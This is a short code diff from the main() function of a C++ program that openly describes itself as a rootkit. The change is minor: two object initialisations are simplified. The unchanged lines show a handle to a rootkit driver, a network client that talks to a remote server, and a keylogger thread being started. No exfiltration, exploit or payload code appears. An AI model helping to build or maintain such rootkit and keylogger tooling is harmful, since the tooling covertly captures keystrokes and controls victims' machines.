@@ -9,13 +9,13 @@ static void executeCommands(Driver::DriverHandler& rootkit_handler, Network::Roo
 int main(int argc, const char* argv[]) {
 
 	//rootkit_handler: interacts with rootkit driver
-	Driver::DriverHandler rootkit_handler = Driver::DriverHandler();
+	Driver::DriverHandler rootkit_handler;
 
 	if (rootkit_handler.hDevice == INVALID_HANDLE_VALUE)
 		return logError("couldn't open a handle");
 
 	//network_client: interacts with the server.
-	Network::RootkitClient network_client = Network::RootkitClient();
+	Network::RootkitClient network_client;
 
 	//keylogger thread
 	std::thread t(Logger::logger_thread);
